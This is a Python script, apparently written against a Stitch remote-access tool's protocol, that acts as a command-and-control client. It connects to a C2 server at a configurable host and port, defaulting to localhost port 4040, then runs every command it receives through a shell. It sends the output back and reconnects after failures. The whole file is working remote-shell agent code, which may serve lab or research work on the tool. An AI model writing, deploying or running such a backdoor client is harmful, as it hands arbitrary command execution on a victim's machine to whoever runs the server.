#!/usr/bin/env python3
"""
Proper Stitch protocol implementation
Based on research findings
"""

import socket
import struct
import base64
import time
import subprocess
import sys
import os

class StitchProtocolClient:
    def __init__(self, host='127.0.0.1', port=4040):
        self.host = host
        self.port = port
        self.socket = None
        
    def st_send(self, data):
        """Send data with Stitch protocol (size header + data)"""
        if isinstance(data, str):
            data = data.encode()
            
        # Pack size as 4-byte integer (big-endian)
        size = struct.pack('>I', len(data))
        
        # Send size then data
        self.socket.sendall(size + data)
        
    def st_receive(self):
        """Receive data with Stitch protocol"""
        # Receive size header (4 bytes)
        size_data = self.socket.recv(4)
        if not size_data:
            return
        # Unpack size
        size = struct.unpack('>I', size_data)[0]
        
        # Receive actual data
        data = b''
        while len(data) < size:
            chunk = self.socket.recv(size - len(data))
            if not chunk:
                break
            data += chunk
            
        return data.decode()
        
    def connect(self):
        """Connect to C2 server with proper handshake"""
        try:
            self.socket = socket.socket()
            self.socket.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            
            # Send identification
            # Based on research, server might expect specific format
            self.st_send("stitch_connection")
            
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
            
    def command_loop(self):
        """Handle commands from C2"""
        while True:
            try:
                # Receive command
                cmd = self.st_receive()
                if not cmd:
                    break
                    
                print(f"[*] Command: {cmd}")
                
                # Execute command
                if cmd == 'exit':
                    break
                elif cmd == 'whoami':
                    output = os.getlogin()
                elif cmd == 'pwd':
                    output = os.getcwd()
                elif cmd.startswith('echo '):
                    output = cmd[5:]
                else:
                    try:
                        result = subprocess.run(
                            cmd, 
                            shell=True, 
                            capture_output=True, 
                            text=True, 
                            timeout=10
                        )
                        output = result.stdout or result.stderr or "No output"
                    except subprocess.TimeoutExpired:
                        output = "Command timeout"
                    except Exception as e:
                        output = f"Error: {e}"
                
                # Send response
                self.st_send(output)
                
            except Exception as e:
                print(f"[-] Loop error: {e}")
                break
                
        self.socket.close()
        
    def run(self):
        """Main execution"""
        if self.connect():
            self.command_loop()
        else:
            # Retry connection
            time.sleep(5)
            self.run()

if __name__ == "__main__":
    client = StitchProtocolClient()
    client.run()
